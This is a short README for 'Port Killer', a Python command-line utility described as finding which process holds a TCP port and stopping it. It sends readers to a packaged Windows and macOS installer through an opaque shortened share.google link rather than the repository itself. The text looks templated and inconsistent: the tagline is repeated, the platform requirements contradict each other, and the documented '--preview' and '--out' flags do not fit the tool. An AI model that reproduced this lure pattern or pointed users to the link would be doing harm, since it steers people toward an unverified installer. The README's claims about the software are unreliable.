# Port Killer

*Who is bound to :3000, then stop it.*

## What Port Killer is

This repository is **Port Killer**, a network utility. Who is bound to :3000, then stop it.

EADDRINUSE on a dev port wastes a minute in Resource Monitor.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Lookup by TCP port
- Shows PID, name, and path
- Optional stop with a confirm
- IPv4 and IPv6 listeners

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
